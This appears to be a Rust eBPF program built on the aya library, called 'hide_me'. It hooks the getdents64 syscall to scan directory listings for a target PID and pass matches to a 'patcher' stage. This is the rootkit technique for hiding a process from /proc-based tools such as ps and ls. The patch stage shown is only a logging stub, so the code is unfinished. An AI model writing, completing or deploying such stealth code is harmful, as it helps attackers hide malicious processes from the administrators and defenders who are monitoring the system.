#![no_std]
#![no_main]

use core::mem::size_of_val;

use aya_ebpf::{
    helpers::{
        bpf_get_current_pid_tgid,
        gen::{bpf_probe_read_user, bpf_probe_read_user_str},
    },
    macros::{map, tracepoint},
    maps::{HashMap, ProgramArray},
    programs::TracePointContext,
};
use aya_log_ebpf::info;

use vmlinux::vmlinux::linux_dirent64;

use hide_me_common::*;

#[path = "./vmlinux/mod.rs"]
mod vmlinux;

const PROG_HANDLER: u32 = 0;
const PROG_PATCHER: u32 = 1;

#[map]
static JUMP_TABLE: ProgramArray = ProgramArray::with_max_entries(2, 0);

#[allow(non_upper_case_globals)]
#[map]
static map_buffs: HashMap<usize, u64> = HashMap::<usize, u64>::with_max_entries(8192, 0);

#[allow(non_upper_case_globals)]
#[map]
static map_bytes_read: HashMap<usize, usize> = HashMap::<usize, usize>::with_max_entries(8192, 0);

#[allow(non_upper_case_globals)]
#[map]
static map_to_patch: HashMap<usize, usize> = HashMap::<usize, usize>::with_max_entries(8192, 0);

#[tracepoint]
pub fn hide_me(ctx: TracePointContext) -> u32 {
    handle_getdents_enter(ctx).unwrap_or_else(|the_ret| the_ret)
}

fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
    let the_target_ppid = unsafe { target_ppid };

    if the_target_ppid == 0 {
        return Ok(0);
    }

    let pid_tgid = bpf_get_current_pid_tgid() as usize;

    // let pid = pid_tgid >> 32;
    // cat /sys/kernel/debug/tracing/events/syscalls/sys_enter_getdents64/format
    // field:unsigned int fd;                  offset:16; size:8; signed:0;
    // field:struct linux_dirent64 * dirent;   offset:24; size:8; signed:0;
    // field:unsigned int count;               offset:32; size:8; signed:0;
    let fd: u32 = unsafe { ctx.read_at(16).unwrap() };
    let buff_count: u32 = unsafe { ctx.read_at(32).unwrap() };
    // 获取dirent指针内存地址
    let dirp: *const linux_dirent64 = unsafe { ctx.read_at(24).unwrap() };
    map_buffs.insert(&pid_tgid, &(dirp as u64), 0).unwrap();
    Ok(0)
}

#[tracepoint]
fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
    // cat /sys/kernel/debug/tracing/events/syscalls/sys_exit_getdents64/format
    // field:long ret;                         offset:16; size:8; signed:1;
    let pid_tgid = bpf_get_current_pid_tgid() as usize;
    let total_bytes_read: i64 = unsafe { ctx.read_at(16).unwrap() };

    if total_bytes_read <= 0 {
        return Ok(0);
    }

    let pbuff_addr = unsafe { map_buffs.get(&pid_tgid) };

    if pbuff_addr.is_none() {
        return Ok(0);
    }

    let pbuff_addr = pbuff_addr.unwrap();

    let buff_addr = *pbuff_addr;

    // linux_dirent64 结构体 大小
    let mut d_reclen: u16 = 0;

    let mut dirp: *const linux_dirent64 = core::ptr::null();

    let mut filename: [u8; MAX_FILE_LEN] = [0; MAX_FILE_LEN];

    // 记录当前遍历的位置 bpos
    let mut bpos: usize = 0;

    let pBPOS = unsafe { map_bytes_read.get(&pid_tgid) };

    if let Some(pBPOS) = pBPOS {
        bpos = *pBPOS;
    } else {
        bpos = 0;
    }

    for _ in 0..128 {
        if bpos >= total_bytes_read as usize {
            break;
        }

        dirp = (buff_addr + bpos as u64) as *const linux_dirent64;

        unsafe {
            bpf_probe_read_user(
                &d_reclen as *const _ as *mut core::ffi::c_void,
                size_of_val(&d_reclen) as u32,
                &((*dirp).d_reclen) as *const _ as *const core::ffi::c_void,
            );

            if pid_to_hide_len >= 11 {
                return Ok(0);
            }

            bpf_probe_read_user_str(
                filename.as_mut_ptr() as *mut core::ffi::c_void,
                pid_to_hide_len,
                (*dirp).d_name.as_ptr() as *const core::ffi::c_void,
            );

            let mut j: usize = 0;
            while j < pid_to_hide_len as usize {
                if filename[j] != pid_to_hide[j] {
                    break;
                }
                j += 1;
            }

            if j == pid_to_hide_len as usize {
                map_bytes_read.remove(&pid_tgid).unwrap();
                map_buffs.remove(&pid_tgid).unwrap();

                if JUMP_TABLE.tail_call(&ctx, PROG_PATCHER).is_err() {
                    return Ok(0);
                }
            }
        }
        map_to_patch.insert(&pid_tgid, &(dirp as usize), 0).unwrap();
        bpos += d_reclen as usize;
    }

    if bpos < total_bytes_read as usize {
        map_bytes_read.insert(&pid_tgid, &bpos, 0).unwrap();

        unsafe {
            if JUMP_TABLE.tail_call(&ctx, PROG_HANDLER).is_err() {
                return Ok(0);
            }
        }
    }
    map_bytes_read.remove(&pid_tgid).unwrap();
    map_buffs.remove(&pid_tgid).unwrap();

    return Ok(0);
}

#[tracepoint]
fn handle_getdents_patch(ctx: TracePointContext) -> Result<u32, u32> {
    info!(&ctx, "evening");
    return Ok(0);
}

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    unsafe { core::hint::unreachable_unchecked() }
}
